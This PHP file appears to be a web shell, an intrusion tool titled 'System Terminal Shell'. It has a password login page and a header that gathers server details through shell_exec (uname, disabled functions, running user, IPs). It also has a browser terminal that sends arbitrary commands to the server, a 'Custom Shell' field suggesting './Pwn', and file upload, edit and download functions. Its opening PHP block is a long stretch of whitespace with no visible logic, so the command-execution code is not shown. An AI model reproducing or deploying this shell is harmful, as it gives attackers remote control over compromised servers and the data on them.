<?php
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PHP Terminal Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: 'Orbitron', 'Courier New', monospace; margin: 0; padding: 20px; text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00; }
        .login-container { max-width: 400px; margin: 50px auto; text-align: center; background: #1a1a1a; padding: 20px; border: 2px solid #00ff00; box-shadow: 0 0 15px #00ff00, 0 0 30px #00ff00; border-radius: 5px; }
        input[type="password"], input[type="text"] { width: 100%; background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 8px; font-family: 'Orbitron', 'Courier New', monospace; text-shadow: 0 0 5px #00ff00; box-shadow: inset 0 0 5px #00ff00; box-sizing: border-box; }
        input[type="submit"] { background: #00ff00; color: #000; border: none; padding: 8px 15px; cursor: pointer; font-family: 'Orbitron', 'Courier New', monospace; text-shadow: none; box-shadow: 0 0 10px #00ff00; border-radius: 3px; margin-top: 10px; }
        input[type="submit"]:hover { background: #00cc00; box-shadow: 0 0 15px #00cc00; }
        .error { color: #ff0000; text-shadow: 0 0 5px #ff0000; }
        .login-image-wrapper { text-align: center; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>System Terminal Login</h2>
        <form method="post">
            <input type="password" name="password" placeholder="Enter password" autofocus>
            <br><br>
            <input type="submit" value="Login">
        </form>
        <?php if (isset($login_error) && !empty($login_error)) { ?>
            <p class="error"><?php echo $login_error; ?></p>
        <?php } ?>
    </div>
    <div class="login-image-wrapper">
        <img src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExNjZwdGpicmw2bmZwcHpmcDg1ZGZuZ2t5cWh1cGI0Y2lzdDB6aGh0ZCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/xxlo1yG0pvhJqNhhtj/giphy.gif" alt="Login GIF" width="250" height="250">
    </div>
</body>
</html>
<?php
    exit;
}

// Gather system information for header
$uname = function_exists('shell_exec') && is_function_enabled('shell_exec') ? (shell_exec($is_windows ? 'ver 2>&1' : 'uname -a 2>&1') ?: 'N/A') : 'N/A';
$disabled_functions = ini_get('disable_functions') ?: 'None';
$safe_mode = ini_get('safe_mode') ? 'On' : 'Off';
$php_version = phpversion();
$server_ip = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : (function_exists('gethostbyname') ? gethostbyname(gethostname()) : 'N/A');
$client_ip = $_SERVER['REMOTE_ADDR'];
$date_time = date('Y-m-d H:i:s');
if (!$is_windows && function_exists('posix_getpwuid') && function_exists('posix_geteuid') && function_exists('posix_getgrgid') && function_exists('posix_getegid')) {
    $user_info = @posix_getpwuid(@posix_geteuid());
    $group_info = @posix_getgrgid(@posix_getegid());
    $user = $user_info ? $user_info['name'] : 'Unknown';
    $group = $group_info ? $group_info['name'] : 'N/A';
} else {
    $user = getenv('USERNAME') ?: (function_exists('get_current_user') ? get_current_user() : 'Unknown');
    $group = getenv('USERDOMAIN') ?: 'N/A';
}
$cwd = $_SESSION['cwd'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>System Terminal Shell v<?php echo $version; ?></title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: 'Orbitron', 'Courier New', monospace; margin: 0; padding: 0; text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00; }
        .header { position: fixed; top: 0; left: 0; right: 0; background: #1a1a1a; padding: 10px; border-bottom: 2px solid #00ff00; box-shadow: 0 0 15px #00ff00; z-index: 1000; font-size: 12px; display: flex; justify-content: space-between; }
        .header-left, .header-right { flex: 1; }
        .header-right { text-align: right; }
        .header p { margin: 3px 10px; }
        .terminal-container { margin: 180px 20px 80px 20px; }
        #terminal { background: #1a1a1a; border: 2px solid #00ff00; padding: 10px; height: 50vh; overflow-y: auto; margin-bottom: 10px; box-shadow: 0 0 15px #00ff00, 0 0 30px #00ff00; border-radius: 5px; word-wrap: break-word; }
        #terminal p { margin: 2px 0; }
        .input-area { display: flex; align-items: center; }
        .prompt { color: #00ff00; text-shadow: 0 0 5px #00ff00; margin-right: 5px; white-space: nowrap; }
        #command, #custom_shell { background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 8px; font-family: 'Orbitron', 'Courier New', monospace; text-shadow: 0 0 5px #00ff00; box-shadow: inset 0 0 5px #00ff00; box-sizing: border-box; }
        #command { flex-grow: 1; }
        #custom_shell { width: 150px; }
        .custom-shell-group { margin-left: 10px; text-align: center; display: flex; flex-direction: column; align-items: center; }
        .custom-shell-group label { font-size: 0.8em; margin-top: 4px; display:block; }
        .error { color: #ff0000; text-shadow: 0 0 5px #ff0000; }
        .action-btn, .logout-btn { background: #00ff00; color: #000; border: none; padding: 8px 15px; cursor: pointer; font-family: 'Orbitron', 'Courier New', monospace; text-shadow: none; box-shadow: 0 0 10px #00ff00; border-radius: 3px; margin-left: 10px; }
        .action-btn:hover, .logout-btn:hover { background: #00cc00; box-shadow: 0 0 15px #00cc00; }
        .footer { position: fixed; bottom: 0; left: 0; right: 0; background: #1a1a1a; padding: 10px; border-top: 2px solid #00ff00; box-shadow: 0 0 15px #00ff00; text-align: center; z-index: 1000; }
        input[type="file"] { color: #00ff00; font-family: 'Orbitron', 'Courier New', monospace; }
        .modal { display: none; position: fixed; z-index: 2000; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.8); }
        .modal-content { background-color: #1a1a1a; margin: 10% auto; padding: 20px; border: 2px solid #00ff00; width: 80%; color: #00ff00; box-shadow: 0 0 25px #00ff00; }
        .modal-content textarea { width: 100%; height: 400px; background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 8px; font-family: 'Courier New', monospace; margin-bottom: 10px; box-sizing: border-box; }
        .close-btn { color: #aaa; float: right; font-size: 28px; font-weight: bold; cursor: pointer; }
        .close-btn:hover, .close-btn:focus { color: #fff; text-decoration: none; }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-left">
            <p><strong>Uname:</strong> <?php echo htmlspecialchars($uname, ENT_QUOTES, 'UTF-8'); ?></p>
            <p><strong>Disabled Functions:</strong> <?php echo htmlspecialchars($disabled_functions, ENT_QUOTES, 'UTF-8'); ?></p>
            <p><strong>Date and Time:</strong> <?php echo htmlspecialchars($date_time, ENT_QUOTES, 'UTF-8'); ?></p>
            <p><strong>User:</strong> <?php echo htmlspecialchars($user, ENT_QUOTES, 'UTF-8'); ?> <strong>Group:</strong> <?php echo htmlspecialchars($group, ENT_QUOTES, 'UTF-8'); ?></p>
            <p><strong>CWD:</strong> <span id="cwd_display"><?php echo htmlspecialchars($cwd, ENT_QUOTES, 'UTF-8'); ?></span></p>
        </div>
        <div class="header-right">
            <form method="post" style="display: inline;">
                <input type="hidden" name="logout" value="1">
                <input type="submit" value="Logout" class="logout-btn">
            </form>
            <p><strong>Safe Mode:</strong> <?php echo $safe_mode; ?></p>
            <p><strong>PHP Version:</strong> <?php echo $php_version; ?></p>
            <p><strong>Server IP:</strong> <?php echo htmlspecialchars($server_ip, ENT_QUOTES, 'UTF-8'); ?></p>
            <p><strong>Client IP:</strong> <?php echo htmlspecialchars($client_ip, ENT_QUOTES, 'UTF-8'); ?></p>
        </div>
    </div>

    <div class="terminal-container">
        <div id="terminal"></div>
        <div class="input-area">
           <span class="prompt" id="prompt">$ </span>
           <input type="text" id="command" autofocus>
           <div class="custom-shell-group">
               <input type="text" id="custom_shell" placeholder="(e.g. ./Pwn)">
               <label for="custom_shell"><b>Custom Shell</b></label>
           </div>
        </div>
    </div>

    <div class="footer">
        <form method="post" enctype="multipart/form-data" style="display: inline;">
            <input type="file" name="file" required>
            <input type="submit" value="Upload" class="action-btn">
        </form>
        <?php if (isset($upload_message) && !empty($upload_message)) { ?>
            <p style="margin-top: 5px;" class="<?php echo strpos($upload_message, 'Error') === 0 ? 'error' : ''; ?>">
                <?php echo $upload_message; ?>
            </p>
        <?php } ?>
    </div>

    <div id="editorModal" class="modal">
        <div class="modal-content">
            <span class="close-btn">&times;</span>
            <h3 id="editorFileName">Edit File</h3>
            <textarea id="editorContent"></textarea>
            <button id="saveButton" class="action-btn">Save</button>
        </div>
    </div>

    <script>
        var terminal = document.getElementById('terminal');
        var commandInput = document.getElementById('command');
        var customShellInput = document.getElementById('custom_shell');
        var promptSpan = document.getElementById('prompt');
        var cwdSpan = document.getElementById('cwd_display');
        var editorModal = document.getElementById('editorModal');
        var editorFileNameSpan = document.getElementById('editorFileName');
        var editorContentTextarea = document.getElementById('editorContent');
        var saveButton = document.getElementById('saveButton');
        var closeBtn = document.querySelector('.close-btn');
        var currentFilePath = '';

        var commandHistory = [];
        var historyIndex = -1;

        commandInput.addEventListener('keydown', function(e) {
            if (e.keyCode === 13) { // Enter key
                e.preventDefault();
                var command = commandInput.value.trim();
                if (command !== '') {
                    appendToTerminalOutput('$ ' + command);
                    commandHistory.push(command);
                    historyIndex = commandHistory.length;

                    if (command.toLowerCase() === 'clear') {
                        terminal.innerHTML = '';
                    } else {
                        sendCommand(command);
                    }
                    commandInput.value = '';
                }
            } else if (e.keyCode === 38) { // Up arrow
                e.preventDefault();
                if (historyIndex > 0) {
                    historyIndex--;
                    commandInput.value = commandHistory[historyIndex];
                    commandInput.focus();
                    commandInput.setSelectionRange(commandInput.value.length, commandInput.value.length);
                }
            } else if (e.keyCode === 40) { // Down arrow
                 e.preventDefault();
                if (historyIndex < commandHistory.length - 1) {
                    historyIndex++;
                    commandInput.value = commandHistory[historyIndex];
                } else if (historyIndex === commandHistory.length - 1) {
                     historyIndex++;
                     commandInput.value = '';
                }
                commandInput.focus();
                commandInput.setSelectionRange(commandInput.value.length, commandInput.value.length);
            }
        });

        function appendToTerminal(htmlContent, isError) {
            var p = document.createElement('p');
            p.innerHTML = htmlContent;
            if (isError) {
                p.className = 'error';
            }
            terminal.appendChild(p);
            terminal.scrollTop = terminal.scrollHeight;
        }

        function appendToTerminalOutput(text, isError) {
            var p = document.createElement('p');
            var safeText = text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
            p.innerHTML = safeText.replace(/\n/g, '<br>');
            if (isError) {
                p.className = 'error';
            }
            terminal.appendChild(p);
            terminal.scrollTop = terminal.scrollHeight;
        }


        function updatePrompt(cwd) {
            cwdSpan.textContent = cwd;
        }

        function sendCommand(command) {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '<?php echo $_SERVER['PHP_SELF']; ?>', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    try {
                        var response = JSON.parse(xhr.responseText);
                        if (response.output) {
                            appendToTerminal(response.output.replace(/\n/g, '<br>'), response.output.indexOf('Error:') === 0 || response.output.indexOf('Error: ') !== -1);
                        }
                        if (response.cwd) {
                            updatePrompt(response.cwd);
                        }
                        if (response.action === 'edit') {
                            openEditor(response.filepath, response.content);
                        } else if (response.action === 'download') {
                             window.location.href = '<?php echo $_SERVER['PHP_SELF']; ?>?download=' + response.filepath;
                        }
                    } catch (e) {
                        console.error("Failed to parse JSON response:", xhr.responseText, e);
                        appendToTerminalOutput('Error: Failed to parse server response. Check console/logs. Response: ' + xhr.responseText.substring(0,100) + '...', true);
                    }
                } else if (xhr.readyState === 4) {
                    appendToTerminalOutput('Error: Server request failed. Status: ' + xhr.status, true);
                }
            };
            xhr.send('command=' + encodeURIComponent(command) + '&custom_shell=' + encodeURIComponent(customShellInput.value));
        }

        function openEditor(filepath, content) {
            currentFilePath = filepath;
            editorFileNameSpan.textContent = 'Edit: ' + filepath;
            editorContentTextarea.value = content;
            editorModal.style.display = 'block';
            editorContentTextarea.focus();
        }

        function closeEditor() {
            editorModal.style.display = 'none';
        }

        closeBtn.onclick = closeEditor;
        window.onclick = function(event) {
            if (event.target == editorModal) {
                closeEditor();
            }
        }

        saveButton.onclick = function() {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '<?php echo $_SERVER['PHP_SELF']; ?>', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function() {
                 if (xhr.readyState === 4 && xhr.status === 200) {
                     try {
                        var response = JSON.parse(xhr.responseText);
                         appendToTerminal(response.output.replace(/\n/g, '<br>'), response.output.indexOf('Error:') === 0);
                         closeEditor();
                     } catch(e) {
                         console.error("Failed to parse save response:", xhr.responseText, e);
                         appendToTerminalOutput('Error: Failed to parse save response. Check console.', true);
                     }
                 } else if (xhr.readyState === 4) {
                     appendToTerminalOutput('Error: Failed to save file. Status: ' + xhr.status, true);
                 }
            };
            xhr.send('action=save_file&filepath=' + encodeURIComponent(currentFilePath) + '&content=' + encodeURIComponent(editorContentTextarea.value));
        };
    </script>
</body>
</html>
